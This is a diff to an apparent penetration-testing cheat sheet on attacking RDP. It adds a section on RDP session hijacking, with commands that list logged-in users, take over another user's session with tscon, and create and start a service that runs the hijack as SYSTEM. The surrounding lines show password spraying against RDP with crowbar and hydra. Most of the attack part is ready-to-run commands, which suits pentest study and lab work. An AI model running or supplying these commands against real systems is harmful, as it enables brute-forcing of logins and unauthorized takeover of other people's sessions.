@@ -742,7 +742,31 @@ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
 
-- **RDP Security Check**
+### RDP Session Hijacking
+- we need to have `SYSTEM` privileges and use the Microsoft `tscon.exe` binary
+- we can use several methods to obtain SYSTEM privileges, such as `PsExec` or `Mimikatz`.
+- `Note:` This method no longer works on Server 2019
+```shell
+# check user sessions
+query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+
+# hijack
+tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+
+# create a service to hijack
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+# start the sessionhijack service
+net start sessionhijack
+```
+
+
+### RDP Security Check
 ```shell
 # install cpan for installing Perl modules
 $ sudo cpan
